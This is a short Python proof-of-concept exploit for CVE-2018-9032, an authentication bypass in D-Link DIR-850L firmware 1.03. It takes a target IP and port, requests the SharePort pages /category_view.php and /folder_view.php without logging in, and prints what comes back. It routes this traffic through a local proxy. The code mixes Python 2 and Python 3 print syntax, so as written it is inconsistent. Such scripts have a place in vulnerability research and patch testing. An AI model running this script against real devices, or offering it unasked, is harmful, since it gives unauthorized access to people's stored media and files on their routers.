#Device: D-Link DIR-850L Firmware: 1.03
import requests
import sys
from colorama import Fore

decription= r"""
 -----------------------------------------------------------------------------
|                              CVE-2018-9032                                 |
|                                                                            |
|  D-Link DIR-850L is vulnerable to An authentication bypass.                | 
|  This vulnerability allows attackers to bypass SharePort Web Access Portal | 
|  by directly accessing authenticated pages such as /category_view.php or   |
|  /folder_view.php.                                                         |
|                                                                            |
|  This could potentially allow unauthorized remote access of media stored   |
|  in SharePort and may perform write operation in the portal.               |
 -----------------------------------------------------------------------------
"""

if len(sys.argv) is not 3:
	print(decription)
	print(Fore.YELLOW+"[-] Example: python cve-2018-9032.py <Target IP> <Port>"+Fore.RESET)
	sys.exit()

target = sys.argv[1]
port = sys.argv[2]

proxies = {'http':'http://localhost:8080', 'https':'http://localhost:8080'} 

URL1 = 'http://'+target+':'+port+'/category_view.php'
URL2 = 'http://'+target+':'+port+'/folder_view.php'

res1 = requests.get(URL1, proxies=proxies)

print ('/category_view.php')
print res1.text

print ('\n----------------------------------------------------------------------------------------------------\n')

res2 = requests.get(URL2, proxies=proxies)

print ('/folder_view.php')
print res2.text
